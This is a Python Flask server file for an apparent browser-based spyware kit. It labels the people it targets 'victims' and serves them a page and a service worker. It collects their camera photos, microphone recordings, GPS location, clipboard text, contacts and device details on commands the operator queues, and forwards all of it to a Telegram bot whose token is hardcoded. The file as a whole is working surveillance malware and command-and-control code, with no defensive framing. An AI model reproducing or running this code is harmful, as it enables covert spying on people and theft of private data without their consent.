from flask import Flask, request, jsonify, send_file, send_from_directory
import requests, os, base64, json
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN  = "8771761542:AAFjOOPoNEFE2-ZS9asez2yV-V2QWrbQnXs"
ADMIN_ID   = 8228850860
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

victims = {}
pending = {}

def tg(method, **kwargs):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/{method}",
            json=kwargs, timeout=10)
    except:
        pass

def notify(text, markup=None):
    kwargs = {"chat_id": ADMIN_ID, "text": text, "parse_mode": "HTML"}
    if markup:
        kwargs["reply_markup"] = markup
    tg("sendMessage", **kwargs)

def send_photo_tg(path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={"chat_id": ADMIN_ID, "caption": caption},
                files={"photo": f}, timeout=30)
    except:
        pass

def send_audio_tg(path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendVoice",
                data={"chat_id": ADMIN_ID, "caption": caption},
                files={"voice": f}, timeout=30)
    except:
        pass

def send_doc_tg(path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                data={"chat_id": ADMIN_ID, "caption": caption},
                files={"document": f}, timeout=30)
    except:
        pass

def control_buttons(vid):
    return {
        "inline_keyboard": [
            [
                {"text": "📸 Front Cam",  "callback_data": f"photo_user_{vid}"},
                {"text": "📸 Back Cam",   "callback_data": f"photo_env_{vid}"},
            ],
            [
                {"text": "📍 Location",   "callback_data": f"location_{vid}"},
                {"text": "🎙️ Record Mic", "callback_data": f"mic_{vid}"},
            ],
            [
                {"text": "📋 Clipboard",  "callback_data": f"clipboard_{vid}"},
                {"text": "📞 Contacts",   "callback_data": f"contacts_{vid}"},
            ],
            [
                {"text": "🔋 Battery",    "callback_data": f"battery_{vid}"},
                {"text": "ℹ️ Device Info","callback_data": f"info_{vid}"},
            ],
        ]
    }

@app.route("/")
def index():
    return send_file("index.html")

@app.route("/sw.js")
def sw():
    return send_file("sw.js", mimetype="application/javascript")

@app.route("/manifest.json")
def manifest():
    return send_file("manifest.json", mimetype="application/json")

@app.route("/api/info", methods=["POST"])
def recv_info():
    d   = request.json or {}
    vid = d.get("vid", request.remote_addr)
    ts  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    victims[vid] = {"info": d, "last_seen": ts}
    pending.setdefault(vid, [])
    notify(
        f"🔔 <b>New Victim!</b>\n"
        f"──────────────────────\n"
        f"🆔 ID      : <code>{vid}</code>\n"
        f"🕐 Time    : {ts}\n"
        f"🌐 IP      : {d.get('ip','N/A')}\n"
        f"📍 City    : {d.get('city','N/A')}\n"
        f"🌍 Country : {d.get('country','N/A')}\n"
        f"🌐 ISP     : {d.get('isp','N/A')}\n"
        f"📱 Device  : {str(d.get('device','N/A'))[:60]}\n"
        f"🔋 Battery : {d.get('battery','N/A')}\n"
        f"📶 Network : {d.get('network','N/A')}\n"
        f"🖥️ Screen  : {d.get('screen','N/A')}\n"
        f"🕐 Zone    : {d.get('timezone','N/A')}\n"
        f"──────────────────────\n"
        f"👇 Control Panel:",
        markup=control_buttons(vid)
    )
    return jsonify({"status": "ok", "vid": vid})

@app.route("/api/poll", methods=["POST"])
def poll():
    d    = request.json or {}
    vid  = d.get("vid", "")
    cmds = pending.get(vid, [])
    if cmds:
        cmd = cmds.pop(0)
        pending[vid] = cmds
        return jsonify({"cmd": cmd})
    return jsonify({"cmd": None})

@app.route("/api/photo", methods=["POST"])
def recv_photo():
    d    = request.json or {}
    data = d.get("data", "")
    cam  = d.get("camera", "unknown")
    vid  = d.get("vid", "unknown")
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    if data:
        if "," in data:
            data = data.split(",")[1]
        path = os.path.join(UPLOAD_DIR, f"{ts}_{cam}.jpg")
        with open(path, "wb") as f:
            f.write(base64.b64decode(data))
        send_photo_tg(path, f"📸 {cam} | {vid} | {ts}")
    return jsonify({"status": "ok"})

@app.route("/api/location", methods=["POST"])
def recv_location():
    d   = request.json or {}
    lat = d.get("lat", 0)
    lon = d.get("lon", 0)
    acc = d.get("accuracy", "N/A")
    vid = d.get("vid", "unknown")
    ts  = datetime.now().strftime("%H:%M:%S")
    try:
        tg("sendLocation", chat_id=ADMIN_ID,
           latitude=float(lat), longitude=float(lon))
    except:
        pass
    notify(
        f"📍 <b>Location</b> | {vid}\n"
        f"Lat: {lat} | Lon: {lon}\n"
        f"Accuracy: {acc}m | {ts}\n"
        f"<a href='https://maps.google.com/?q={lat},{lon}'>🗺️ Open Maps</a>"
    )
    return jsonify({"status": "ok"})

@app.route("/api/microphone", methods=["POST"])
def recv_audio():
    d    = request.json or {}
    data = d.get("data", "")
    vid  = d.get("vid", "unknown")
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    if data:
        if "," in data:
            data = data.split(",")[1]
        path = os.path.join(UPLOAD_DIR, f"audio_{ts}.ogg")
        with open(path, "wb") as f:
            f.write(base64.b64decode(data))
        send_audio_tg(path, f"🎙️ Mic | {vid} | {ts}")
    return jsonify({"status": "ok"})

@app.route("/api/clipboard", methods=["POST"])
def recv_clipboard():
    d    = request.json or {}
    text = d.get("text", "")
    vid  = d.get("vid", "unknown")
    notify(f"📋 <b>Clipboard</b> | {vid}\n──────────────────────\n{text[:1000]}")
    return jsonify({"status": "ok"})

@app.route("/api/contacts", methods=["POST"])
def recv_contacts():
    d        = request.json or {}
    contacts = d.get("contacts", [])
    vid      = d.get("vid", "unknown")
    ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
    if contacts:
        path = os.path.join(UPLOAD_DIR, f"contacts_{ts}.json")
        with open(path, "w") as f:
            json.dump(contacts, f, indent=2, ensure_ascii=False)
        send_doc_tg(path, f"📞 Contacts | {vid} | {len(contacts)} entries")
    return jsonify({"status": "ok"})

@app.route("/api/battery", methods=["POST"])
def recv_battery():
    d   = request.json or {}
    vid = d.get("vid", "unknown")
    lvl = d.get("level", "N/A")
    chg = d.get("charging", False)
    notify(
        f"🔋 <b>Battery</b> | {vid}\n"
        f"Level: {lvl}%\n"
        f"Charging: {'Yes ⚡' if chg else 'No 🔋'}"
    )
    return jsonify({"status": "ok"})

@app.route("/webhook", methods=["POST"])
def webhook():
    d    = request.json or {}
    call = d.get("callback_query")
    if not call:
        return jsonify({"ok": True})
    data    = call.get("data", "")
    call_id = call.get("id")
    tg("answerCallbackQuery", callback_query_id=call_id, text="✅ Sent!")

    # parse — format: action_vid
    if data.startswith("photo_user_"):
        vid = data[len("photo_user_"):]
        pending.setdefault(vid, []).append("photo_user")
        notify(f"📸 Front cam sent → {vid}")

    elif data.startswith("photo_env_"):
        vid = data[len("photo_env_"):]
        pending.setdefault(vid, []).append("photo_env")
        notify(f"📸 Back cam sent → {vid}")

    elif data.startswith("location_"):
        vid = data[len("location_"):]
        pending.setdefault(vid, []).append("location")
        notify(f"📍 Location request sent → {vid}")

    elif data.startswith("mic_"):
        vid = data[len("mic_"):]
        pending.setdefault(vid, []).append("mic")
        notify(f"🎙️ Mic request sent → {vid}")

    elif data.startswith("clipboard_"):
        vid = data[len("clipboard_"):]
        pending.setdefault(vid, []).append("clipboard")
        notify(f"📋 Clipboard request sent → {vid}")

    elif data.startswith("contacts_"):
        vid = data[len("contacts_"):]
        pending.setdefault(vid, []).append("contacts")
        notify(f"📞 Contacts request sent → {vid}")

    elif data.startswith("battery_"):
        vid = data[len("battery_"):]
        pending.setdefault(vid, []).append("battery")
        notify(f"🔋 Battery request sent → {vid}")

    elif data.startswith("info_"):
        vid = data[len("info_"):]
        if vid in victims:
            v  = victims[vid]
            d2 = v.get("info", {})
            notify(
                f"ℹ️ <b>Device Info</b> | {vid}\n"
                f"──────────────────────\n"
                f"IP: {d2.get('ip','N/A')}\n"
                f"City: {d2.get('city','N/A')}\n"
                f"Country: {d2.get('country','N/A')}\n"
                f"Battery: {d2.get('battery','N/A')}\n"
                f"Network: {d2.get('network','N/A')}\n"
                f"Screen: {d2.get('screen','N/A')}\n"
                f"OS: {d2.get('os','N/A')}\n"
                f"Lang: {d2.get('lang','N/A')}\n"
                f"Timezone: {d2.get('timezone','N/A')}\n"
                f"Last seen: {v.get('last_seen','N/A')}",
                markup=control_buttons(vid)
            )
    return jsonify({"ok": True})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
